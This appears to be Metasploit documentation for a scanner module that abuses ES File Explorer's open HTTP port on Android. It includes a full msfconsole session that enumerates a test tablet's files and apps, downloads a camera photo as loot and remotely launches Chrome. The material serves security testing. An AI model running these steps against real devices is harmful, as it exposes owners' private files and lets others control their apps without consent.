## Vulnerable Application

  ES File Explorer has an HTTP server that runs and accepts 
  certain commands. The HTTP server is started on app launch, and is 
  available as long as the app is open. ES File Explorer launches as
  a service in the background on device boot. Version 4.1.9.7.4 and below 
  are reported vulnerable. This module has been tested against 
  [4.1.9.5.1](https://www.apkmirror.com/apk/es-global/es-file-explorer/es-file-explorer-4-1-9-5-1-release/).

  This module includes all functionality from the original [POC](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)
  except for the `getAppThumbnail` command.

  Available actions:

 *  **APPLAUNCH**       Launch an app. ACTIONITEM required.
 *  **GETDEVICEINFO**   Get device info
 *  **GETFILE**         Get a file from the device. ACTIONITEM required.
 *  **LISTAPPS**        List all the apps installed
 *  **LISTAPPSALL**     List all the apps installed
 *  **LISTAPPSPHONE**   List all the phone apps installed
 *  **LISTAPPSSDCARD**  List all the apk files stored on the sdcard
 *  **LISTAPPSSYSTEM**  List all the system apps installed
 *  **LISTAUDIOS**      List all the audio files
 *  **LISTFILES**       List all the files on the sdcard
 *  **LISTPICS**        List all the pictures
 *  **LISTVIDEOS**      List all the videos

  Not all of the information from the commands is printed to screen, however the origin JSON
  content is stored in loot for reference.


## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use modules/auxiliary/scanner/http/es_file_explorer_open_port```
  4. Do: ```run```
  5. You should get device information

## Options

  **ACTION**

  The action to perform.  See description in Vulnerable Application section for additional details.  Default is `GETDEVICEINFO`.

  **ACTIONITEM**

  If running `APPLAUNCH` or `GETFILE`, this is the app to launch or file to download.

## Scenarios

### ES File Explorer 4.1.9.5.1 on a Dragon Touch Y88X on Android 4.4

```
resource (es.rb)> use modules/auxiliary/scanner/http/es_file_explorer_open_port
resource (es.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (es.rb)> set action GETDEVICEINFO
action => GETDEVICEINFO
resource (es.rb)> run
[+] 1.1.1.1:59777  - Name: Y88X
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTFILES
action => LISTFILES
resource (es.rb)> run
[+] 1.1.1.1:59777  
  folder: bootloader (0.00 Bytes) - 3/23/2019 10:36:51 AM
  folder: databk (0.00 Bytes) - 3/23/2019 10:36:49 AM
  folder: sdcard (4.00 KB) - 3/23/2019 02:15:24 PM
  folder: storage (0.00 Bytes) - 3/23/2019 10:36:49 AM
  folder: config (0.00 Bytes) - 3/23/2019 10:36:49 AM
  folder: cache (4.00 KB) - 3/24/2019 07:37:46 AM
  folder: acct (0.00 Bytes) - 3/23/2019 10:36:49 AM
  folder: vendor (4.00 KB) - 1/31/2015 05:56:49 AM
  folder: d (0.00 Bytes) - 12/31/1969 07:00:00 PM
  folder: etc (4.00 KB) - 2/3/2015 03:51:06 AM
  folder: mnt (0.00 Bytes) - 3/23/2019 10:36:49 AM
  file: ueventd.sun8i.rc (1.18 KB) - 12/31/1969 07:00:00 PM
  file: ueventd.rc (3.93 KB) - 12/31/1969 07:00:00 PM
  folder: system (4.00 KB) - 12/31/1969 07:00:00 PM
  folder: sys (0.00 Bytes) - 3/23/2019 10:36:45 AM
  file: sepolicy (73.82 KB) - 12/31/1969 07:00:00 PM
  file: seapp_contexts (656.00 Bytes) - 12/31/1969 07:00:00 PM
  folder: sbin (0.00 Bytes) - 12/31/1969 07:00:00 PM
  folder: res (0.00 Bytes) - 12/31/1969 07:00:00 PM
  file: property_contexts (2.11 KB) - 12/31/1969 07:00:00 PM
  folder: proc (0.00 Bytes) - 12/31/1969 07:00:00 PM
  file: nand.ko (1.47 MB) - 12/31/1969 07:00:00 PM
  file: initlogo.rle (2.34 MB) - 12/31/1969 07:00:00 PM
  file: init.usb.rc (3.82 KB) - 12/31/1969 07:00:00 PM
  file: init.trace.rc (1.75 KB) - 12/31/1969 07:00:00 PM
  file: init.sunxi.wifi.bt.rc (1010.00 Bytes) - 12/31/1969 07:00:00 PM
  file: init.sun8i.usb.rc (3.40 KB) - 12/31/1969 07:00:00 PM
  file: init.sun8i.rc (4.67 KB) - 12/31/1969 07:00:00 PM
  file: init.recovery.sun8i.rc (97.00 Bytes) - 12/31/1969 07:00:00 PM
  file: init.rc (23.12 KB) - 12/31/1969 07:00:00 PM
  file: init.environ.rc (919.00 Bytes) - 12/31/1969 07:00:00 PM
  file: init (183.40 KB) - 12/31/1969 07:00:00 PM
  file: fstab.sun8i (1.64 KB) - 12/31/1969 07:00:00 PM
  file: file_contexts (9.03 KB) - 12/31/1969 07:00:00 PM
  file: default.prop (116.00 Bytes) - 12/31/1969 07:00:00 PM
  folder: data (4.00 KB) - 3/23/2019 10:36:52 AM
  file: charger (274.11 KB) - 12/31/1969 07:00:00 PM
  folder: root (0.00 Bytes) - 1/31/2015 05:24:35 AM
  folder: dev (2.62 KB) - 3/23/2019 10:37:14 AM

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTVIDEOS
action => LISTVIDEOS
resource (es.rb)> run
[+] 1.1.1.1:59777  
  DragonTouch-text.mp4 (55.30 MB) - 1/20/1970 10:18:53 PM: /storage/emulated/0/Movies/DragonTouch-text.mp4

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTAUDIOS
action => LISTAUDIOS
resource (es.rb)> run
[+] 1.1.1.1:59777  
  Calendar Notification.ogg (52.89 KB) - 8/6/2015 08:15:30 PM: /storage/emulated/0/Notifications/Calendar Notification.ogg

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTAPPSSYSTEM
action => LISTAPPSSYSTEM
resource (es.rb)> run
[+] 1.1.1.1:59777  
  Package Access Helper (com.android.defcontainer) Version: 4.4.2-20150203
  Launcher (com.android.launcher) Version: 4.4.2-20150203
  Contacts (com.android.contacts) Version: 4.4.2-20150203
  com.android.providers.partnerbookmarks (com.android.providers.partnerbookmarks) Version: 4.4.2-20150203
```
...snip...

```
  Chrome (com.android.chrome) Version: 67.0.3396.87
  Shell (com.android.shell) Version: 4.4.2-20150203
  Google Contacts Sync (com.google.android.syncadapters.contacts) Version: 4.4.2-940549

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTAPPSPHONE
action => LISTAPPSPHONE
resource (es.rb)> run
[+] 1.1.1.1:59777  
  Package Access Helper (com.android.defcontainer) Version: 4.4.2-20150203
  Launcher (com.android.launcher) Version: 4.4.2-20150203
  Contacts (com.android.contacts) Version: 4.4.2-20150203
  com.android.providers.partnerbookmarks (com.android.providers.partnerbookmarks) Version: 4.4.2-20150203
  Mobile Data (com.android.phone) Version: 4.4.2-20150203
  Calculator (com.android.calculator2) Version: 4.4.2-20150203
```
...snip...

```
  Calendar (com.google.android.calendar) Version: 5.8.28-195646716-release
  Face Unlock (com.android.facelock) Version: 4.4.2-940549
  Chrome (com.android.chrome) Version: 67.0.3396.87
  Shell (com.android.shell) Version: 4.4.2-20150203
  Google Contacts Sync (com.google.android.syncadapters.contacts) Version: 4.4.2-940549

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTAPPSSDCARD
action => LISTAPPSSDCARD
resource (es.rb)> run
[+] 1.1.1.1:59777  

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTAPPSALL
action => LISTAPPSALL
resource (es.rb)> run
[+] 1.1.1.1:59777  
  Package Access Helper (com.android.defcontainer) Version: 4.4.2-20150203
  Launcher (com.android.launcher) Version: 4.4.2-20150203
  Contacts (com.android.contacts) Version: 4.4.2-20150203
```
...snip...

```
  com.android.keyguard (com.android.keyguard) Version: 4.4.2-20150203
  Calendar (com.google.android.calendar) Version: 5.8.28-195646716-release
  Face Unlock (com.android.facelock) Version: 4.4.2-940549
  Chrome (com.android.chrome) Version: 67.0.3396.87
  Shell (com.android.shell) Version: 4.4.2-20150203
  Google Contacts Sync (com.google.android.syncadapters.contacts) Version: 4.4.2-940549

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTPICS
action => LISTPICS
resource (es.rb)> run
[+] 1.1.1.1:59777  
  IMG_20190323_165608.jpg (140.06 KB) - 3/23/2019 04:56:08 PM: /storage/emulated/0/DCIM/Camera/IMG_20190323_165608.jpg

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action GETFILE
action => GETFILE
resource (es.rb)> set actionitem /storage/emulated/0/DCIM/Camera/IMG_20190323_165608.jpg
actionitem => /storage/emulated/0/DCIM/Camera/IMG_20190323_165608.jpg
resource (es.rb)> run
[+] 1.1.1.1:59777  - /storage/emulated/0/DCIM/Camera/IMG_20190323_165608.jpg saved to /root/.msf4/loot/20190324073855_default_1.1.1.1_getFile_670725.jpg
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action LISTAPPS
action => LISTAPPS
resource (es.rb)> run
[+] 1.1.1.1:59777  
  TalkBack (com.google.android.marvin.talkback) Version: 5.0.7
  Google Play services (com.google.android.gms) Version: 12.6.85 (000302-197041431)
  Phone (com.andriod.phone) Version: 1.0
  Google Play Music (com.google.android.music) Version: 8.12.7210-1.F
  Google Text-to-speech Engine (com.google.android.tts) Version: 3.15.18.200023596
  Cloud Print (com.google.android.apps.cloudprint) Version: 1.40
  com.softwinner.videotest (com.softwinner.videotest) Version: 1.0
  APUS (com.apusapps.launcher) Version: 2.3.1
  Settings (com.android.system.io.settings) Version: 11.1.0
  DragonPhone (com.softwinner.dragonphone) Version: 1.0
  com.mediatek.touch (com.mediatek.touch) Version: 21_zh80001
  Google Play Store (com.android.vending) Version: 13.9.17-all [0] [PR] 236777123
  com.android.google.settings (com.android.google.settings) Version: 17_zh10317
  MainActivity (com.metasploit.stage) Version: 1.0
  Gmail (com.google.android.gm) Version: 8.6.3.200445973.release
  L-Uninstall (com.clear.uninstall) Version: 2.0
  ES File Explorer (com.estrongs.android.pop) Version: 4.1.9.5.1
  DragonFire-v2.3 (com.softwinner.dragonfire) Version: 2.3 release
  YouTube (com.google.android.youtube) Version: 13.23.59
  Calendar (com.google.android.calendar) Version: 5.8.28-195646716-release
  Chrome (com.android.chrome) Version: 67.0.3396.87

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> set action APPLAUNCH
action => APPLAUNCH
resource (es.rb)> set actionitem com.android.chrome
actionitem => com.android.chrome
resource (es.rb)> run
[+] 1.1.1.1:59777  - com.android.chrome launched successfully
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (es.rb)> loot

Loot
====

host           service  type                 name                                                     content                   info  path
----           -------  ----                 ----                                                     -------                   ----  ----
1.1.1.1        getDeviceInfo.json   es_file_explorer_getdeviceinfo.json                      application/json                /root/.msf4/loot/20190324073803_default_1.1.1.1_getDeviceInfo.js_744272.bin
1.1.1.1        listFiles.json       es_file_explorer_listfiles.json                          application/json                /root/.msf4/loot/20190324073803_default_1.1.1.1_listFiles.json_522563.bin
1.1.1.1        listVideos.json      es_file_explorer_listvideos.json                         application/json                /root/.msf4/loot/20190324073803_default_1.1.1.1_listVideos.json_623335.bin
1.1.1.1        listAudio.json       es_file_explorer_listaudio.json                          application/json                /root/.msf4/loot/20190324073803_default_1.1.1.1_listAudio.json_331531.bin
1.1.1.1        listAppsSystem.json  es_file_explorer_listappssystem.json                     application/json                /root/.msf4/loot/20190324073821_default_1.1.1.1_listAppsSystem.j_581712.bin
1.1.1.1        listAppsPhone.json   es_file_explorer_listappsphone.json                      application/json                /root/.msf4/loot/20190324073838_default_1.1.1.1_listAppsPhone.js_773512.bin
1.1.1.1        listAppsSdcard.json  es_file_explorer_listappssdcard.json                     application/json                /root/.msf4/loot/20190324073838_default_1.1.1.1_listAppsSdcard.j_543396.bin
1.1.1.1        listAppsAll.json     es_file_explorer_listappsall.json                        application/json                /root/.msf4/loot/20190324073854_default_1.1.1.1_listAppsAll.json_886297.bin
1.1.1.1        listPics.json        es_file_explorer_listpics.json                           application/json                /root/.msf4/loot/20190324073855_default_1.1.1.1_listPics.json_831055.bin
1.1.1.1        getFile              /storage/emulated/0/DCIM/Camera/IMG_20190323_165608.jpg  application/octet-stream        /root/.msf4/loot/20190324073855_default_1.1.1.1_getFile_670725.jpg
1.1.1.1        listApps.json        es_file_explorer_listapps.json                           application/json                /root/.msf4/loot/20190324073856_default_1.1.1.1_listApps.json_189709.bin
```
